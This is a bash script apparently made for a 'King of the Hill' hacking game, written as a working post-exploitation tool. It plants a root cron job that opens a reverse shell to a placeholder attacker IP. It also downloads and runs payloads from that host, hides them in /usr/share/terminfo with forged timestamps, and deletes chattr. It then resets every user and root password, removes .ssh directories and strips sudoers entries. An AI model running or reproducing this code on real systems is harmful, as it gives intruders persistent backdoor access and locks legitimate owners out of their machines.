#!/usr/local/bin/bash

nick="Trevohack"
IP="attacker_ip"
PORT="9999"
WEB_PORT="80"


echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$IP/9999 0>&1'" | sudo tee -a /etc/crontab >/dev/null 2>&1
pwd="treva"
sudoers_file="/etc/sudoers"
black='\e[0;30m'
red='\e[0;31m'
green='\e[0;32m'
yellow='\e[0;33m'
blue='\e[0;34m'
purple='\e[0;35m'
cyan='\e[0;36m'
white='\e[0;37m'
reset='\e[0m'

if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root" >&2
    exit 1
fi 

function inits() {
    echo -e "[${green}+${reset}] Initializing the environment\n"

    rm /usr/bin/chattr >/dev/null 2>&1

    sysctl -w kernel.modules_disabled=1 >/dev/null 2>&1
    wget "$IP:$WEB_PORT/www/km" -O /usr/share/terminfo/azx >/dev/null 2>&1 && chmod +x /usr/share/terminfo/azx  >/dev/null 2>&1
    wget "$IP:$WEB_PORT/www/chattr" -O /usr/share/terminfo/axx >/dev/null 2>&1 && chmod +x /usr/share/terminfo/axx >/dev/null 2>&1
    wget "$IP:$WEB_PORT/king/king.sh" -O /usr/share/terminfo/axz >/dev/null 2>&1 && chmod +x /usr/share/terminfo/axz >/dev/null 2>&1

    touch -r /usr/bin/xz /usr/share/terminfo/azx >/dev/null 2>&1
    touch -r /usr/bin/xz /usr/share/terminfo/axx >/dev/null 2>&1
    touch -r /usr/bin/xz /usr/share/terminfo/axz >/dev/null 2>&1
}

function remove_king() {
    echo -e "${green}+[${reset}] Removing current king\n"

    set write off 
    chmod 400 /root/king.txt >/dev/null 2>&1
    umount -l /root/king.txt >/dev/null 2>&1
    /usr/share/terminfo/axx -iacud /root/king.txt >/dev/null 2>&1
}

function king() {
    echo -e "${green}+[${reset}] $nick comes for king\n"
    echo "$nick" > /root/king.txt >/dev/null 2>&1
    /usr/share/terminfo/axz 
    /usr/share/terminfo/axx +ia  /usr/share/terminfo/azx >/dev/null 2>&1
}

function protect() {
    echo -e "${green}+[${reset}] Changing Passwords\n"

    for user_home in /home/*; do
        username=$(basename "$user_home")

        if [ -d "$user_home" ] && [ "$username" != "lost+found" ]; then
            echo "Changing password for user: $username"
            echo "$username:$pwd" | sudo chpasswd 
            if [ -d "$user_home/.ssh" ]; then
                echo "Removing .ssh directory for user: $username"
                rm -rf "$user_home/.ssh"
            fi
        fi
    done 
    echo "root:$pwd" | sudo chpasswd 

    echo -e "[${green}+${reset}] Checking sudoers\n"
    special_users=$(grep -Po '^[\w-]+(?=\s+ALL=\(ALL\)(?:\s+NOPASSWD:)?\s+ALL)' "$sudoers_file")

    if [ -n "$special_users" ]; then
        echo "Users found in sudoers file. Removing them..."
        for user in $special_users; do
            sed -i "/^$user/d" "$sudoers_file"
            echo "Removed user: $user"
        done
        echo -e "[${green}+${reset}] $sudoers_file is safe\n"
    else
        echo -e "[${green}+${reset}] $sudoers_file is safe\n"
    fi
}





inits
remove_king
king
protect

